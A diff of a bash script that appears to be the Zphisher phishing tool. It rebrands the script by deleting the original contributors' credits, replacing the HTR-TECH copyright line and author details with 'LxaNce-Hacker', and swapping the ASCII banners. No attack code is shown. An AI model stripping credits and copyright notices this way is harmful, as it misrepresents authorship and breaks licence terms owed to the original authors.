@@ -5,18 +5,6 @@
 ##   Version 	: 	2.2
 ##   Github 	: 	https://github.com/LxaNce-Hacker
 
-##   THANKS TO :
-##   Aditya Shakya - https://github.com/adi1090x
-##   1RaY-1 - https://github.com/1RaY-1
-##   Ali Milani Amin - https://github.com/AliMilani
-##   Moises Tapia - https://github.com/MoisesTapia
-##   TheLinuxChoice - https://twitter.com/linux_choice
-##   DarksecDevelopers  - https://github.com/DarksecDevelopers
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Võ Ngọc Bảo - https://github.com/vongocbao
-##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
-
-
 ## If you Copy Then Give the credits :)
 
 
@@ -91,7 +79,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
+##      Copyright (C) 2022  LxaNce-Hacker (https://github.com/LxaNce-Hacker)
 ##
 
 
@@ -154,16 +142,11 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.2
+		${ORANGE}░█░░░█░█░░░░█▀█░█░█░▀█▀░█▀▀░█░█
+		${ORANGE}░█░░░▄▀▄░░░░█▀▀░█▀█░░█░░▀▀█░█▀█
+		${ORANGE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀ ${RED}Version : 2.2
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce(Prince Katiyar)${WHITE}
 	EOF
 }
 
@@ -171,9 +154,9 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+		${BLUE}░█░░░█░█░░░░█▀█░█░█░▀█▀░█▀▀░█░█
+		${BLUE}░█░░░▄▀▄░░░░█▀▀░█▀█░░█░░▀▀█░█▀█
+		${BLUE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀${WHITE} 2.2
 	EOF
 }
 
@@ -312,13 +295,12 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
+		${GREEN}Author   ${RED}:  ${ORANGE}Prince Katiyar ${RED}[ ${ORANGE}LxaNce-Hacker ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/LxaNce-Hacker
+		${GREEN}Social   ${RED}:  ${CYAN}https://Coming.soon...
 		${GREEN}Version  ${RED}:  ${ORANGE}2.2
 
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1,AliMilani ${RESETBG}
+		${REDBG}${WHITE} Thanks : For Support ${RESETBG}
 
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
